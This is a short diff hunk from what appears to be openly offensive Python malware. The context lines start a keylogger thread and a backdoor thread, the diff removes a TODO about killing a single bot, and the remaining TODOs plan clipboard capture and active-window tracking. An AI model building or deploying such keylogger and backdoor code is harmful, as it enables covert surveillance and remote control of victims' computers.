@@ -526,7 +526,6 @@ thread1 = threading.Thread(name='sic1', target=keylogger, args=[fd_temp]).start(
 # Backdoor's thread
 thread2 = threading.Thread(name='sic2', target=backdoor).start()
 
-# TODO: Add function to kill a single bot
 # TODO: Split source in modules
 # TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
 # TODO: Add active window recognition
